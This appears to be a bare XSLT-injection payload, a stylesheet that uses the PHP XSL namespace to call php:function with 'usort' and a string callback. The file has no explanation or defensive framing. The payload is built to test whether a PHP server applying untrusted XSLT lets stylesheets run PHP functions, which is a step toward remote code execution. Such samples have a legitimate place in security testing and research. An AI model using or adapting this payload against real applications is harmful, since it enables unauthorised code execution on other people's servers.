<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
         <xsl:template match="/">
                  
      <xsl:value-of  select="php:function('usort', 'a', 'function(){return 1;}')"/>
  
                 
         </xsl:template>
  </xsl:stylesheet>
